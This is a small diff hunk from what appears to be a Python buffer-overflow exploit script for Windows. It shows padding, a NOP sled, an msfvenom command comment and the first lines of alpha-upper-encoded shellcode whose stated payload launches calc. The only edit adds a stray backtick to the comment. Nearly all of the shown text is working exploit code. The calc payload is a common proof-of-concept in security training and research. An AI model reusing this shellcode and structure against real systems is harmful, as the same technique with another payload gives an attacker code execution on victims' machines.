@@ -13,7 +13,7 @@ prependesp = 'C' * 4
 # nop sled
 shellcode = '\x90' * 25
 
-# msfvenom -p windows/exec CMD=calc -f python -e x86/alpha_upper -b "\x00" 
+# msfvenom -p windows/exec CMD=calc -f python -e x86/alpha_upper -b "\x00"` 
 shellcode =  shellcode
 shellcode += "\x89\xe7\xd9\xcd\xd9\x77\xf4\x58\x50\x59\x49\x49\x49"
 shellcode += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
